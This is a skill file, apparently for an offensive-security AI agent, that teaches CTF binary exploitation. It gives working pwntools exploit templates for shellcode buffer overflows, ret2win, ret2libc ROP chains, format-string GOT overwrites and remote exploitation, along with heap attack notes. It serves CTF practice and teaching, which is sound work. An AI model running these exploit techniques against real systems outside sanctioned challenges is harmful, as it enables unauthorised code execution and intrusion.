<!-- aegis-local: forked 2026-05-04 from pikpikcu/airecon@9a21453459d87eefb012ea355c79b593d0d3c0cc (MIT-licensed); attribution preserved, see ATTRIBUTION.md -->

---
name: ctf-pwn
description: CTF binary exploitation — buffer overflow, format string, ROP chains, ret2libc, heap exploitation, shellcode, using pwntools and GDB with PEDA/pwndbg in Docker Kali Linux
---

# CTF Binary Exploitation (PWN)

PWN = find memory corruption → control instruction pointer → execute shellcode or ROP chain.

## AIRecon Docker Constraints (Headless Only)

- AIRecon executes through Docker engine and terminal tools only.
- Avoid GUI-dependent debuggers and RE suites:
  - no IDA GUI, no Ghidra UI, no x64dbg, no visual exploit IDE workflows.
- Prefer deterministic CLI pipeline:
  - `checksec`, `file`, `nm`, `objdump`, `readelf`, `ROPgadget`, `gdb` batch, `pwntools`.
- Keep exploitation reproducible:
  - write exploit scripts to `output/` or `tools/`,
  - run them via `execute`,
  - store proof outputs in files so the agent can reason across iterations.
- If an approach needs manual GUI interaction, replace it with scriptable equivalent before proceeding.

**Install:**
```
pip install pwntools --break-system-packages
sudo apt-get install -y gdb gdb-peda radare2 checksec binutils ltrace strace
# pwndbg: git clone https://github.com/pwndbg/pwndbg /home/pentester/tools/pwndbg && cd /home/pentester/tools/pwndbg && ./setup.sh
# PEDA: git clone https://github.com/longld/peda /home/pentester/tools/peda && echo "source /home/pentester/tools/peda/peda.py" >> ~/.gdbinit
sudo apt-get install -y python3-pwntools
```

---

## Binary Analysis First

    # Check protections:
    checksec --file=./vuln
    # Output: RELRO, Stack Canary, NX, PIE, ASLR
    # NX=No Execute (stack shellcode won't work)
    # PIE=Position Independent Executable (ASLR on binary itself)
    # Canary=Stack cookie (BOF must leak/bypass)

    # Find file type:
    file ./vuln
    # ELF 64-bit / 32-bit, dynamically/statically linked

    # Strings — find hardcoded flags, passwords, format strings:
    strings ./vuln
    strings -n 6 ./vuln | grep -i "flag\|pass\|key\|secret"

    # Symbols and functions:
    nm ./vuln | grep -i "func\|main\|win\|shell"
    objdump -d ./vuln | grep -A5 "win\|shell\|system"

    # Dynamic analysis — trace syscalls and library calls:
    strace ./vuln                    # syscalls
    ltrace ./vuln                    # library calls (libc functions)

---

## GDB with PEDA/pwndbg

    gdb ./vuln

    # Basic commands:
    run                              # Start program
    run < <(python3 -c "print('A'*100)")   # With input
    break main                       # Breakpoint at main
    break *0x4011a3                  # Breakpoint at address
    info functions                   # List all functions
    info registers                   # Register state
    x/20wx $esp                      # Examine 20 words at ESP (32-bit)
    x/20gx $rsp                      # Examine 20 qwords at RSP (64-bit)
    x/s 0x4020a0                     # Examine string at address
    disassemble main                 # Disassemble function
    p system                         # Print address of system()
    p puts                           # Print address of puts()
    find &system, +9999999, "/bin/sh" # Find "/bin/sh" string

    # PEDA shortcuts:
    pattern create 200               # Create cyclic pattern
    pattern offset <value>           # Find offset from crashed EIP/RIP
    checksec                         # Security of current binary
    ropgadget                        # Find ROP gadgets

    # pwndbg shortcuts:
    cyclic 200                       # Cyclic pattern
    cyclic -l <value>                # Find offset
    vmmap                            # Memory map
    got                              # Global Offset Table

---

## Stack Buffer Overflow (BOF)

### Find Offset

    # Method 1: cyclic pattern (pwntools)
    python3 -c "from pwn import *; print(cyclic(200).decode())" | ./vuln
    # Read crashed EIP/RIP value, then:
    python3 -c "from pwn import *; print(cyclic_find(0x<crashed_value>))"

    # Method 2: binary search manually
    python3 -c "print('A'*100 + 'B'*4 + 'C'*100)" | ./vuln  # EIP=BBBB?

### Basic BOF — No Protections (no NX, no canary, no PIE)

    # shellcode = execve("/bin/sh") for x86-64:
    python3 -c "
    from pwn import *
    context.arch = 'amd64'  # or 'i386' for 32-bit
    p = process('./vuln')
    offset = 40            # adjust per cyclic
    shellcode = asm(shellcraft.sh())
    payload = shellcode + b'A' * (offset - len(shellcode)) + p64(0x<stack_address>)
    p.sendline(payload)
    p.interactive()
    "

### ret2win — function that calls system("/bin/sh") or prints flag

    python3 -c "
    from pwn import *
    p = process('./vuln')
    win_addr = 0x4011b6   # address of win() function (from nm or objdump)
    offset = 40
    payload = b'A' * offset + p64(win_addr)  # p32() for 32-bit
    p.sendline(payload)
    p.interactive()
    "

### ret2libc — NX enabled, no PIE, no canary

    python3 -c "
    from pwn import *
    elf = ELF('./vuln')
    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
    p = process('./vuln')

    # Step 1: Leak libc address via puts@plt -> puts@got
    pop_rdi = 0x<rop_gadget_pop_rdi_ret>   # find with: ROPgadget --binary ./vuln | grep 'pop rdi'
    puts_plt = elf.plt['puts']
    puts_got = elf.got['puts']
    main = elf.sym['main']

    payload  = b'A' * <offset>
    payload += p64(pop_rdi)
    payload += p64(puts_got)
    payload += p64(puts_plt)
    payload += p64(main)    # return to main for round 2
    p.sendline(payload)

    # Step 2: Calculate libc base from leaked puts address
    leak = u64(p.recvuntil(b'\n')[:-1].ljust(8, b'\x00'))
    libc.address = leak - libc.sym['puts']
    print(f'libc base: {hex(libc.address)}')

    # Step 3: Call system('/bin/sh')
    ret_gadget = 0x<ret_gadget>   # ROPgadget --binary ./vuln | grep ': ret$'
    payload2  = b'A' * <offset>
    payload2 += p64(ret_gadget)   # stack alignment for x86-64
    payload2 += p64(pop_rdi)
    payload2 += p64(next(libc.search(b'/bin/sh')))
    payload2 += p64(libc.sym['system'])
    p.sendline(payload2)
    p.interactive()
    "

---

## ROP Chain

    # Find gadgets:
    ROPgadget --binary ./vuln | grep "pop rdi"
    ROPgadget --binary ./vuln | grep ": ret$"
    ROPgadget --binary ./vuln --rop   # automated ROP chain suggestion

    # ropper (alternative):
    sudo apt-get install -y ropper
    ropper -f ./vuln --search "pop rdi"

---

## Format String Vulnerability

    # Detect: input '%x.%x.%x' → if output shows hex values = vulnerable
    printf '%x.%x.%x.%x.%x' | ./vuln

    # Find offset (which positional arg contains your input):
    python3 -c "print('AAAA' + '.%x' * 20)" | ./vuln
    # Find where 41414141 appears → that's your offset (e.g., position 6)

    # Leak arbitrary address value:
    python3 -c "
    from pwn import *
    p = process('./vuln')
    target_addr = 0x<address_to_read>
    payload = p32(target_addr) + b'.%6\$s'   # position 6 = your offset
    p.sendline(payload)
    p.interactive()
    "

    # Overwrite arbitrary address (GOT overwrite):
    python3 -c "
    from pwn import *
    p = process('./vuln')
    got_exit = 0x<exit_got_address>
    win = 0x<win_function_address>
    # Build format string write: writes win address to exit@GOT
    payload = fmtstr_payload(6, {got_exit: win})  # offset=6
    p.sendline(payload)
    p.interactive()
    "

---

## Remote Exploitation

    python3 -c "
    from pwn import *
    # Switch between local and remote:
    # p = process('./vuln')
    p = remote('target.ctf', 1337)
    # ... rest of exploit ...
    "

---

## Quick Exploit Template (pwntools)

    # tools/pwn_exploit.py
    from pwn import *

    context.log_level = 'info'
    context.arch = 'amd64'   # i386 for 32-bit

    elf = ELF('./vuln')
    libc = ELF('./libc.so.6')  # if provided

    # p = process('./vuln')
    # p = remote('host', port)
    p = gdb.debug('./vuln', '''
    break main
    continue
    ''')

    offset = cyclic_find(0xdeadbeef)   # replace with actual crash value

    # Build payload
    payload = flat(
        b'A' * offset,
        p64(0x<address>),
    )

    p.sendlineafter(b'> ', payload)
    p.interactive()

---

## Heap Exploitation (tcache/fastbin — libc 2.27+)

    # Use-After-Free:
    # Allocate chunk → free → use dangling pointer → control next allocation

    # Double Free (tcache < 2.29):
    # free(chunk) → free(chunk) again → tcache corrupted → arbitrary alloc

    # Heap address leak: unsorted bin → fd points to main_arena in libc

    # Tools:
    # heapinspect: pip install heapinspect --break-system-packages
    # pwndbg: heap, bins, chunks commands in GDB

---

## Pro Tips

1. Always run `checksec` first — protections determine attack path
2. NX off + no canary = shellcode on stack (simplest)
3. NX on + no PIE = ret2libc with hardcoded PLT/GOT
4. NX on + PIE + canary = need info leak first (format string or controlled read)
5. For remote: leak libc → calculate base → call system('/bin/sh')
6. `ROPgadget --binary ./vuln --rop` generates automatic chain suggestions
7. Stack alignment: x86-64 requires 16-byte aligned stack before `call system` → add `ret` gadget

## Summary

PWN flow: `checksec` → `strings` → `gdb` with `cyclic` to find offset → choose attack based on protections:
- No NX: shellcode → ret to stack
- NX, no PIE: ret2win or ret2libc (fixed addresses)
- NX + PIE: leak address → calculate base → ret2libc
- Format string: leak via `%x` chain → write via `fmtstr_payload`
